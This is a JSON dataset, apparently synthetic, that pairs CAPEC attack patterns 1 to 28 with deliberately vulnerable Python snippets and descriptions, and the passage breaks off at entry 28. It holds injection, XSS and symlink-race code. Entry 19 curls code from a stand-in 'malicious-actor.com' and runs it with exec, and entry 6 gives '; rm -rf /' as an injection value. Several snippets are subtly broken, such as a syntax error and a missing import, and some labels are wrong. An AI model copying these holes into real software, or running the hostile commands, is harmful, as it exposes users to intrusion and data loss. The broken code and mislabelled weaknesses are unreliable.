[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import os\n\n# CWE-276: Incorrect Default Permissions\nacl_permissions = {'admin': 'rw', 'user': 'r'}\n\n# CWE-285: Improper Authorization\ndef access_control(resource, user):\n    if user in acl_permissions and acl_permissions[user] == 'rw':\n        return True\n    return False\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    if file.endswith('.exe') or file.endswith('.sh'):\n        return False\n    return True\n\n# CWE-693: Protection Mechanism Failure\ndef check_permissions(resource, user):\n    if not access_control(resource, user):\n        return False\n    return True\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\ncritical_resource = '/etc/passwd'\n\n# CWE-1220: Insufficient Granularity of Access Control\ndef access_critical_resource(user):\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key'\n\n# CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\nfabric_bridge = {'trusted': 'untrusted'}\n\n# CWE-1314: Missing Write Protection for Parametric Data Values\nparametric_data = {'sensor_value': 10}\n\n# CWE-1315: Improper Setting of Bus Controlling Capability in Fabric End-point\nbus_controller = {'enabled': True}\n\n# CWE-1318: Missing Support for Security Features in On-chip Fabrics or Buses\non_chip_fabrics = {'security_features': False}\n\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nerror_messages = {'signal_condition': 'high'}\n\n# CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\nobject_prototype = {'__proto__': {'isAdmin': True}}\n\n# CWE-1327: Binding to an Unrestricted IP Address\nip_address = '0.0.0.0'\n\n# CAPEC: Inadequate Authorization\nif access_control('resource', 'user') and upload_file('file.txt') and check_permissions('resource', 'user') and access_critical_resource('user'):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates inadequate authorization in a Python application. It includes various CWEs related to authorization, access control, and permission assignment. The code allows an attacker to access sensitive information and resources without proper authorization, highlighting the importance of robust access control mechanisms."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\ndef login(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\nattempts = {}\n\nwhile True:\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if username not in attempts:\n        attempts[username] = 0\n    attempts[username] += 1\n    if attempts[username] > 3:\n        print('Account locked out due to excessive login attempts. Try again later.')\n        time.sleep(300)  # 5 minute lockout\n    elif login(username, password):\n        print('Login successful!')\n        break\n    else:\n        print('Invalid username or password. Try again.')",
        "description": "This code snippet demonstrates a vulnerable login system that can be exploited by an attacker to lock out a legitimate user. The system has a weak password requirement (CWE-521), allowing an attacker to easily guess or brute-force the password. The system also has an overly restrictive account lockout mechanism (CWE-645), which can be triggered by an attacker making excessive login attempts (CWE-307). The authentication mechanism can be bypassed due to a primary weakness (CWE-305), and the system does not sufficiently prove the claimed identity (CWE-1390). An attacker can exploit these weaknesses to lock out a legitimate user by making multiple incorrect login attempts, causing the account to be locked out for a certain period of time."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import urllib.parse\n\ndef validate_input(input_string):\n    # CWE-20: Improper Input Validation\n    # CWE-697: Incorrect Comparison\n    if input_string.startswith('https://') or input_string.startswith('http://'):\n        return True\n    else:\n        return False\n\ndef canonicalize_input(input_string):\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-707: Improper Neutralization\n    input_string = urllib.parse.unquote(input_string)\n    return input_string\n\ndef filter_input(input_string):\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    # CWE-707: Improper Neutralization\n    if '..' in input_string or './' in input_string:\n        return False\n    else:\n        return True\n\ndef process_input(input_string):\n    # CWE-179: Incorrect Behavior Order: Early Validation\n    # CWE-183: Permissive List of Allowed Inputs\n    # CWE-184: Incomplete List of Disallowed Inputs\n    if validate_input(input_string):\n        input_string = canonicalize_input(input_string)\n        if filter_input(input_string):\n            # CWE-41: Improper Resolution of Path Equivalence\n            # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n            # CWE-707: Improper Neutralization\n            return {'status': 'success', 'input': input_string}\n        else:\n            return {'status': 'failure', 'input': input_string}\n    else:\n        return {'status': 'failure', 'input': input_string}\n\n# CWE-173: Improper Handling of Alternate Encoding\n# CWE-172: Encoding Error\ninput_string = '%2e%2e/%2e%2e/%2e%2e/etc/passwd'\nprint(process_input(input_string))",
        "description": "This code snippet demonstrates the CAPEC where an adversary can intentionally introduce leading 'ghost' characters that enable the input to pass the filters and therefore process the adversary's input. The code includes various CWEs such as improper input validation, incorrect comparison, improper neutralization, and more."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\ndef authenticate_ip(ip_address):\n    if ip_address == '127.0.0.1':\n        return True\n    else:\n        return False\n\ndef get_hostname(ip_address):\n    return socket.gethostbyaddr(ip_address)[0]\n\ndef access_control(ip_address):\n    if authenticate_ip(ip_address):\n        hostname = get_hostname(ip_address)\n        if hostname == 'localhost':\n            return True\n    return False\n\n# Vulnerable code\nip_address = '0177.0000.0000.0001'\nif access_control(ip_address):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that relies on IP addresses for authentication. The `authenticate_ip` function checks if the provided IP address is '127.0.0.1', and the `get_hostname` function uses reverse DNS resolution to obtain the hostname. The `access_control` function combines these two checks to make a security decision. However, the code does not properly handle alternate encodings of IP addresses, such as the octal encoding used in the example ('0177.0000.0000.0001' is equivalent to '127.0.0.1'). This allows an attacker to bypass the access control by using an alternate encoding."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\ndef impersonate_supervisor_signal(tone_frequency, target_switch):\n    # CWE-285: No authorization check\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target_switch, 1234))\n    sock.send(tone_frequency.encode())\n    # CWE-923: No restriction on communication channel\n    # CWE-940: No verification of source of communication channel\n    response = sock.recv(1024)\n    if response == b'OK':\n        # CWE-294: Capture-replay possible\n        print('Successfully impersonated supervisor signal')\n        # CWE-924: No enforcement of message integrity\n        return response\n    else:\n        print('Failed to impersonate supervisor signal')\n\nimpersonate_supervisor_signal('2600Hz', '10.0.0.1')",
        "description": "Python code snippet demonstrating Blue Boxing attack, where an adversary sends a tone to impersonate a supervisor signal to reroute or usurp command of the line, exploiting vulnerabilities in authorization, communication channels, and message integrity."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(ip_address):\n    command = \"ping -c 1 \" + ip_address\n    os.system(command)\n\nip_address = input(\"Enter IP address: \")\nexecute_command(ip_address)",
        "description": "This Python code snippet is vulnerable to OS command injection (CWE-78) and improper neutralization of special elements used in an OS command (CWE-74). The `execute_command` function takes an IP address as input and constructs a ping command using the input. The `os.system` function is then used to execute the command. An attacker can inject malicious OS commands by providing a specially crafted IP address, such as `; rm -rf /`."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\ndef get_user(username):\n    conn = sqlite3.connect('users.db')\n    c = conn.cursor()\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    c.execute(query)\n    result = c.fetchone()\n    conn.close()\n    return result\n\nusername = input(\"Enter your username: \")\nprint(get_user(username))",
        "description": "This Python code snippet demonstrates Blind SQL Injection (CAPEC-66) by constructing an SQL query using user input without proper validation or sanitization, making it vulnerable to SQL Injection attacks. The code does not handle errors properly, allowing an attacker to inject malicious SQL code and extract sensitive information. The related CWEs are CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\ndef vulnerable_function(buffer):\n    output_buffer = ctypes.create_string_buffer(10)\n    ctypes.memmove(output_buffer, buffer, len(buffer))\n    return output_buffer.raw\n\n# Example usage:\nbuffer = b'a' * 20\nprint(vulnerable_function(buffer))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability. The `vulnerable_function` takes a buffer as input and copies it to an output buffer using `ctypes.memmove` without checking the size of the input buffer. This can lead to a buffer overflow, as the input buffer can be larger than the output buffer. The example usage shows how an attacker can exploit this vulnerability by providing a large input buffer, potentially causing a crash or allowing code execution."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(10)\n    os.system('echo ' + user_input + ' > /tmp/output')\n    buffer.extend(user_input.encode())\n    return buffer\n\nuser_input = 'A' * 100\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that is susceptible to a buffer overflow attack. The `vulnerable_function` takes user input and passes it to the `os.system` function without proper input validation (CWE-20), leading to a potential command injection vulnerability (CWE-74). The function also performs a buffer copy without checking the size of the input (CWE-120), which can cause a buffer overflow. Additionally, the code uses an incorrect comparison (CWE-697) when extending the buffer with the user input, which can lead to an integer overflow (CWE-680) and further exacerbate the buffer overflow vulnerability."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function(env_var):\n    buffer = bytearray(10)\n    os.environ[env_var] = 'A' * 100\n    buffer.extend(os.environ[env_var].encode())\n    return buffer\n\nenv_var = 'SOME_ENV_VAR'\nprint(vulnerable_function(env_var))",
        "description": "This Python code snippet demonstrates a buffer overflow attack through manipulation of environment variables. The vulnerable_function takes an environment variable as input, sets its value to a large string, and then copies it into a fixed-size buffer without checking the size of the input, leading to a buffer overflow (CWE-120). The code also assumes that the environment variable is immutable, but it can be controlled by the attacker (CWE-302). The function does not restrict operations within the boundaries of the buffer, leading to a range error (CWE-118). Additionally, the code does not neutralize special elements in the output, making it vulnerable to injection attacks (CWE-74). The input is not validated, and the function does not control the resource identifiers, making it vulnerable to resource injection (CWE-99). The code also does not handle integer overflows, which can lead to buffer overflows (CWE-680). The comparison of the buffer size is incorrect, leading to a resultant weakness (CWE-697)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "from http.server import SimpleHTTPRequestHandler\nimport os\n\nclass CustomHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        filename = self.path.split('/')[-1]\n        if filename.endswith('.php'):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            with open(filename, 'r') as f:\n                self.wfile.write(f.read().encode())\n        else:\n            self.send_response(403)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b'Access denied')\n\nif __name__ == '__main__':\n    httpd = http.server.HTTPServer(('localhost', 8000), CustomHandler)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable web server that relies on file extensions to determine how to handle requests. The CustomHandler class is used to handle GET requests, and it checks the file extension to decide whether to serve the file or deny access. However, this approach is vulnerable to file extension tampering, allowing an attacker to potentially bypass security restrictions or inject malicious code."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\nclass MulticastClient:\n    def __init__(self, multicast_group, multicast_port):\n        self.multicast_group = multicast_group\n        self.multicast_port = multicast_port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)\n\n    def send_message(self, message, client_id):\n        # CWE-201: Insertion of Sensitive Information Into Sent Data\n        # Sending sensitive information (client_id) along with the message\n        self.sock.sendto(f\"{{'message': '{message}', 'client_id': {client_id}}}\".encode(), (self.multicast_group, self.multicast_port))\n\n    def receive_message(self):\n        data, address = self.sock.recvfrom(1024)\n        message = data.decode()\n        # CWE-306: Missing Authentication for Critical Function\n        # No authentication is performed to verify the sender\n        # CWE-1292: Incorrect Conversion of Security Identifiers\n        # Incorrect conversion of client_id to security identifier\n        client_id = int(message.split(':')[1])\n        # CWE-1290: Incorrect Decoding of Security Identifiers\n        # Incorrect decoding of security identifier\n        if client_id == 1:\n            # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            # No message integrity check is performed\n            print(\"Received message: \", message)\n            return message\n        else:\n            print(\"Invalid client_id\")\n            return None\n\nmulticast_client = MulticastClient('224.1.1.1', 1234)\n\nwhile True:\n    message = input(\"Enter message: \")\n    multicast_client.send_message(message, 1)\n    received_message = multicast_client.receive_message()\n    if received_message:\n        print(\"Received message: \", received_message)\n",
        "description": "This code snippet demonstrates a vulnerable multicast client that sends sensitive information (client_id) along with the message, lacks authentication for critical functions, and incorrectly converts and decodes security identifiers. It also fails to enforce message integrity during transmission, allowing an adversary to impersonate a privileged client and gain unauthorized access."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-285: Improper Authorization\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n# CWE-15: External Control of System or Configuration Setting\n# CWE-73: External Control of File Name or Path\n# CWE-20: Improper Input Validation\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Assuming 'user_input' is a string input from an untrusted source\n\n# CWE-15: External Control of System or Configuration Setting\nos.environ['PATH'] = user_input\n\n# CWE-73: External Control of File Name or Path\nfile_path = user_input\n\n# CWE-20: Improper Input Validation\nif file_path:\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    os.system('cat ' + file_path)\n\n# CWE-285: Improper Authorization\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nif 'admin' in user_input:\n    # Grant admin access without proper authentication\n    print('Admin access granted')\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-20: Improper Input Validation\ndata = user_input\n# No integrity check or validation on the received data\nprint('Received data:', data)\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. It includes multiple CWEs, such as missing support for integrity checks, improper authorization, authentication bypass, injection, external control of system settings, file name or path, and exposure of sensitive information. The code allows user input to control environment variables, file paths, and system settings, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\nHOST = '127.0.0.1'\nPORT = 12345\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((HOST, PORT))\ns.listen(1)\n\nconn, addr = s.accept()\nprint('Connected by', addr)\n\nwhile True:\n    data = conn.recv(1024)\n    if not data:\n        break\n    # CWE-120: No check for buffer size\n    buffer = bytearray(10)\n    buffer.extend(data)\n    # CWE-353: No integrity check\n    conn.sendall(buffer)\n    # CWE-118: Incorrect access of indexable resource\n    index = int.from_bytes(data, 'big')\n    try:\n        buffer[index] = 0x90\n    except IndexError:\n        pass\n    # CWE-119: Improper restriction of operations within the bounds of a memory buffer\n    buffer.extend(b'A' * 100)\n    # CWE-74: Improper neutralization of special elements in output\n    conn.sendall(buffer + b'<script>alert(1)</script>')\n    # CWE-20: Improper input validation\n    if b'exit' in data:\n        break\n    # CWE-680: Integer overflow to buffer overflow\n    size = int.from_bytes(data, 'big')\n    buffer = bytearray(size)\n    buffer.extend(data)\n    # CWE-697: Incorrect comparison\n    if size > 10:\n        conn.sendall(buffer)\n\nconn.close()\n",
        "description": "A custom-built hostile service that exploits a buffer overflow vulnerability in targeted client software through injection of malicious content."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\nusername = input('Enter your username: ')\ncommand = 'cat /etc/passwd | grep ' + username\nos.system(command)\n",
        "description": "This Python code snippet is vulnerable to command injection. It takes a username as input from the user and constructs a command to search for the username in the /etc/passwd file. However, it does not properly sanitize the input, allowing an attacker to inject additional commands by providing a username that includes shell metacharacters, such as semicolons or pipes. This could allow the attacker to execute arbitrary system commands."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\nimport time\n\nusers = {'user1': 'password123', 'user2': 'ilovepython', 'admin': 'letmein'}\n\ndictionary = ['password123', 'ilovepython', 'letmein', 'dragonball', 'naruto', 'onepiece']\n\nfor user, password in users.items():\n    for word in dictionary:\n        if password == word:\n            print(f'Access granted for user {user} with password {password}')\n            break\n        else:\n            print(f'Access denied for user {user} with password {password}')\n            time.sleep(1)  # no delay between attempts\n",
        "description": "This Python code snippet demonstrates a dictionary attack, where an attacker tries each word in a dictionary as passwords to gain access to the system via some user's account. The code uses a simple dictionary of common passwords and checks each user's password against the dictionary. If a match is found, access is granted. The code does not implement any password aging, account lockout, or dual-factor authentication, making it vulnerable to brute force attacks (CWE-307, CWE-308, CWE-309). The password requirements are also weak (CWE-521), and the system relies on a single factor for authentication (CWE-654)."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-285: Improper Authorization\n# CWE-272: Least Privilege Violation\n\n# Define a function to execute a file with elevated privileges\ndef execute_file(file_path):\n    try:\n        # CWE-59: Improper Link Resolution Before File Access ('Link Following')\n        # CWE-282: Improper Ownership Management\n        # CWE-270: Privilege Context Switching Error\n        os.setuid(0)  # Switch to root privileges\n        os.chmod(file_path, 0o777)  # Set permissions to allow anyone to execute\n        os.system(file_path)  # Execute the file\n    finally:\n        os.setuid(1001)  # Switch back to non-root privileges\n\n# CWE-693: Protection Mechanism Failure\n# Define a function to upload a file to a directory with improper permissions\ndef upload_file(file_data, file_path):\n    with open(file_path, 'wb') as f:\n        f.write(file_data)\n    os.chmod(file_path, 0o777)  # Set permissions to allow anyone to read/write/execute\n\n# Example usage\nfile_path = '/tmp/malicious_file'\nfile_data = b'#!/usr/bin/env python\\nprint(\"Malicious file executed\")'\nupload_file(file_data, file_path)\nexecute_file(file_path)",
        "description": "This Python code snippet demonstrates a vulnerable code that allows an adversary to upload and execute a malicious file with elevated privileges. The code has improper permission assignments, authorization, and ownership management, making it vulnerable to various attacks."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/image', methods=['GET'])\ndef image_tag_vulnerability():\n    img_url = request.args.get('img_url')\n    return '<img src=\"' + img_url + '\" />'\n\n@app.route('/comment', methods=['GET'])\ndef xml_comment_vulnerability():\n    comment = request.args.get('comment')\n    return '<!--' + comment + '-->'\n\n@app.route('/error', methods=['GET'])\ndef error_page_vulnerability():\n    error_msg = request.args.get('error_msg')\n    return '<h1>Error: ' + error_msg + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to various types of Cross-Site Scripting (XSS) attacks. The 'image_tag_vulnerability' function takes user input and injects it into an <img> tag without proper validation, allowing an attacker to inject malicious scripts. The 'xml_comment_vulnerability' function injects user input into an XML comment, which can also be used to launch an XSS attack. The 'error_page_vulnerability' function injects user input into an error page, which can be used to launch an XSS attack. These vulnerabilities correspond to CWE-80, CWE-82, CWE-79, CWE-692, and CWE-81."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\ndef execute_script(script_url):\n    script_code = os.popen(f\"curl {script_url}\").read()\n    exec(script_code)\n\n# Untrusted source\nuntrusted_script_url = \"http://malicious-actor.com/malicious_script.py\"\nexecute_script(untrusted_script_url)\n",
        "description": "This Python code snippet demonstrates the CAPEC of executing malicious scripts from untrusted sources. The `execute_script` function downloads a script from a given URL and executes it using the `exec` function. The `untrusted_script_url` variable points to a malicious script hosted on an untrusted domain. This code embodies CWE-284 (Improper Access Control) by allowing remote scripts to be executed, CWE-79 (Cross-site Scripting) by not neutralizing user-controllable input, CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by including web functionality from an untrusted domain, CWE-1265 (Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls) by potentially causing unintended reentrant invocations, and CWE-506 (Embedded Malicious Code) by containing malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import hashlib\nimport base64\n\n# CWE-326: Inadequate Encryption Strength\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# CWE-693: Protection Mechanism Failure\n# CWE-1204: Generation of Weak Initialization Vector (IV)\n# CWE-321: Use of Hard-coded Cryptographic Key\n\ndef encrypt(plaintext, key):\n    # Using a weak encryption algorithm (XOR)\n    cipher_text = ''.join([chr(ord(c) ^ ord(key)) for c in plaintext])\n    return cipher_text\n\n# Hard-coded cryptographic key\nkey = 'my_secret_key'\n\n# Weak initialization vector (IV)\niv = '00000000'\n\n# Encrypting the plaintext\nplaintext = 'This is a secret message'\ncipher_text = encrypt(plaintext, key)\n\nprint('Cipher Text:', cipher_text)\n\n# Brute force attack to determine the key\nfor i in range(1000000):  # Exhaustive search on the key space\n    test_key = str(i).zfill(8)\n    test_cipher_text = encrypt(plaintext, test_key)\n    if test_cipher_text == cipher_text:\n        print('Key Found:', test_key)\n        break",
        "description": "This code snippet demonstrates a vulnerable encryption mechanism that uses a weak encryption algorithm (XOR), a hard-coded cryptographic key, and a weak initialization vector (IV). An attacker can perform a brute force attack to determine the key by exhaustively searching the key space."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import os\nimport hashlib\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, username):\n        session_id = hashlib.sha256(os.urandom(4)).hexdigest()\n        self.sessions[session_id] = {'username': username, 'expires': time.time() + 3600}\n        return session_id\n\n    def validate_session(self, session_id):\n        if session_id in self.sessions:\n            return self.sessions[session_id]['username']\n        return None\n\n    def extend_session(self, session_id):\n        if session_id in self.sessions:\n            self.sessions[session_id]['expires'] = time.time() + 3600\n\n    def delete_session(self, session_id):\n        if session_id in self.sessions:\n            del self.sessions[session_id]\n\n# Example usage:\nmanager = SessionManager()\n\nusername = 'admin'\n\n# Create a new session\nsession_id = manager.create_session(username)\nprint(f'Session created: {session_id}')\n\n# Validate the session\nvalidated_username = manager.validate_session(session_id)\nprint(f'Validated username: {validated_username}')\n\n# Extend the session\nmanager.extend_session(session_id)\nprint(f'Session extended')\n\n# Delete the session\nmanager.delete_session(session_id)\nprint(f'Session deleted')",
        "description": "This code snippet demonstrates a vulnerable session management system that is susceptible to authentication bypass by spoofing attacks. The session IDs are generated using a weak random number generator and are not properly validated. An attacker can easily guess or obtain a valid session ID to perform authorized actions under the guise of an authenticated user. The code also lacks proper control over the session lifetime, making it vulnerable to session fixation attacks. Additionally, the use of persistent cookies containing sensitive information and the lack of origin validation make this code vulnerable to other attacks."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\ndef authenticate_client(client_socket):\n    # CWE-287: Improper Authentication\n    # No authentication mechanism is implemented\n    return True\n\ndef process_client_request(client_socket):\n    # CWE-20: Improper Input Validation\n    # No input validation is performed on the received data\n    data = client_socket.recv(1024)\n    if data == b'admin_request':\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        # Sensitive information is sent to the client without proper authorization\n        client_socket.send(b'sensitive_data')\n    else:\n        client_socket.send(b'invalid_request')\n\ndef main):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 8080))\n    server_socket.listen(1)\n    print('Server started. Waiting for client...')\n    client_socket, address = server_socket.accept()\n    print('Client connected. Authenticating...')\n    if authenticate_client(client_socket):\n        print('Client authenticated. Processing request...')\n        process_client_request(client_socket)\n    else:\n        print('Authentication failed. Disconnecting client...')\n        client_socket.close()\n    server_socket.close()\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates a vulnerable server implementation that is susceptible to authentication bypass and sensitive information exposure attacks. The server does not implement proper authentication or input validation, allowing an attacker to spoof a valid client and gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-20: No input validation\n    if os.path.isfile(file_path):\n        # CWE-434: Unrestricted upload of file with dangerous type\n        # CWE-646: Relying on file name or extension of externally-supplied file\n        if file_path.endswith('.pdf') or file_path.endswith('.exe'):\n            # CWE-433: Unparsed raw web content delivery\n            # CWE-506: Embedded malicious code\n            os.system('start ' + file_path)\n\n# Example usage\nprocess_file('user_uploaded_file.pdf')",
        "description": "This Python code snippet demonstrates the CAPEC of poisoning files with malicious payloads. It lacks input validation, allowing unrestricted uploads of dangerous file types, and relies on file names or extensions to determine behavior. The code then executes the uploaded file, potentially leading to the execution of malicious code."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def process_input(input_string):\n    buffer = bytearray(1024)\n    for i in range(len(input_string)):\n        buffer[i] = ord(input_string[i])\n    return buffer\n\ninput_string = 'A' * 2048\nprocess_input(input_string)",
        "description": "This Python code snippet demonstrates a vulnerable function that copies user input into a fixed-size buffer without checking the size of the input, leading to a buffer overflow. The function process_input() takes an input string and copies it into a buffer of size 1024. However, the input string is not validated, and an attacker can provide an overly long input string, causing a buffer overflow. This code embodies the main idea of the CAPEC, which is to cause an active filter to fail by causing an oversized transaction. CWEs 120, 119, 118, 74, 20, 680, 733, and 697 are all relevant to this code snippet."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\nclass DeadlockExample:\n    def __init__(self):\n        self.lock1 = threading.Lock()\n        self.lock2 = threading.Lock()\n\n    def thread1_func(self):\n        with self.lock1:\n            print('Thread 1 acquired lock 1')\n            # Simulate some work\n            print('Thread 1 is working...')\n            with self.lock2:\n                print('Thread 1 acquired lock 2')\n                print('Thread 1 is working...')\n\n    def thread2_func(self):\n        with self.lock2:\n            print('Thread 2 acquired lock 2')\n            # Simulate some work\n            print('Thread 2 is working...')\n            with self.lock1:\n                print('Thread 2 acquired lock 1')\n                print('Thread 2 is working...')\n\n    def run(self):\n        t1 = threading.Thread(target=self.thread1_func)\n        t2 = threading.Thread(target=self.thread2_func)\n        t1.start()\n        t2.start()\n        t1.join()\n        t2.join()\n\nif __name__ == '__main__':\n    deadlock_example = DeadlockExample()\n    deadlock_example.run()",
        "description": "This Python code snippet demonstrates a deadlock condition, where two threads are competing for locks on shared resources. The `thread1_func` and `thread2_func` methods acquire locks in a different order, leading to a potential deadlock. The `run` method starts both threads, which can cause a deadlock if the locks are not properly synchronized. This code embodies the CAPEC of triggering and exploiting a deadlock condition to cause a denial of service, and relates to CWEs 412, 567, 662, 667, 833, and 1322."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import os\nimport threading\n\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n# CWE-363: Race Condition Enabling Link Following\n\ndef access_file(filename):\n    if os.path.isfile(filename):\n        # CWE-366: Race Condition within a Thread\n        t1 = threading.Thread(target=read_file, args=(filename,))\n        t2 = threading.Thread(target=replace_file, args=(filename,))\n        t1.start()\n        t2.start()\n        t1.join()\n        t2.join()\n\n# CWE-368: Context Switching Race Condition\ndef read_file(filename):\n    with open(filename, 'r') as f:\n        data = f.read()\n    return data\n\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n# CWE-689: Permission Race Condition During Resource Copy\ndef replace_file(filename):\n    new_filename = 'malicious_' + filename\n    with open(new_filename, 'w') as f:\n        f.write('malicious data')\n    os.replace(new_filename, filename)\n\naccess_file('example.txt')",
        "description": "This code snippet demonstrates a race condition vulnerability where two threads concurrently access and modify a file. The first thread reads the file, while the second thread replaces the file with a malicious version. The race condition occurs because the file is not properly synchronized, allowing the malicious file to be read instead of the original file."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\n\n# CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n# CWE-61: UNIX Symbolic Link (Symlink) Following\n# CWE-662: Improper Synchronization\n# CWE-689: Permission Race Condition During Resource Copy\n# CWE-667: Improper Locking\n\ndef create_temp_file():\n    temp_file_name = '/tmp/temp_file'\n    if not os.path.exists(temp_file_name):\n        # Race condition: attacker can create a Symlink here\n        time.sleep(1)  # simulate some delay\n        with open(temp_file_name, 'w') as f:\n            f.write('malicious content')\n\n# Attacker's code\nos.symlink('/etc/passwd', '/tmp/temp_file')\ncreate_temp_file()",
        "description": "Python code snippet demonstrating a Symlink race condition attack. The create_temp_file function checks if a temporary file exists, then creates it. An attacker can create a Symlink to a sensitive file (e.g., /etc/passwd) during the delay between the check and creation, allowing them to write malicious content to the sensitive file."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
